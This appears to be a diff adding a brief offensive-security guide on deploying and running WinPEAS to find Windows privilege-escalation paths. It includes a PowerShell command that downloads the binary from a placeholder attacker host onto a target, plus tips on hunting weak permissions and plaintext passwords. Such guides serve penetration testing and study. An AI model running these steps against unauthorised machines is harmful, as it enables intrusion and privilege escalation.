@@ -1,0 +1,57 @@
+# How to Use WinPEAS
+
+WinPEAS is a Windows Privilege Escalation Awesome Script designed to automate the process of identifying potential privilege escalation paths on Windows systems.
+
+---
+
+## Setup
+
+1. Transfer WinPEAS to the target Windows machine:
+   a. If you have SMB access:
+      smbclient //<target-ip>/share -U username
+      put ~/Desktop/tools/winPEASx64.exe
+
+   b. Alternatively, use a web server to host WinPEAS:
+      - Start a Python HTTP server on your attacker machine:
+        python3 -m http.server 8080
+      - Download WinPEAS on the target:
+        powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker-ip>:8080/winPEASx64.exe', 'C:\Temp\winPEASx64.exe')"
+
+---
+
+## Usage
+
+1. Run WinPEAS on the target machine:
+   a. From Command Prompt:
+      C:\Temp\winPEASx64.exe
+
+   b. From PowerShell:
+      Start-Process "C:\Temp\winPEASx64.exe"
+
+2. Save the output for later review:
+   C:\Temp\winPEASx64.exe > winpeas-output.txt
+
+3. Analyze the output to identify privilege escalation opportunities.
+
+---
+
+## Tips
+
+- Use **WinPEASx64.exe** for 64-bit systems and **WinPEASx86.exe** for 32-bit systems.
+- Focus on key findings:
+  - Misconfigured services
+  - Vulnerable software
+  - Weak permissions
+  - Passwords stored in plaintext
+- Review recommendations from WinPEAS output and prioritize your attack vectors.
+
+---
+
+## Additional Resources
+
+- WinPEAS GitHub: https://github.com/carlospolop/PEASS-ng
+- Detailed documentation and updates are available on the GitHub page.
+
+---
+
+Happy Hacking!
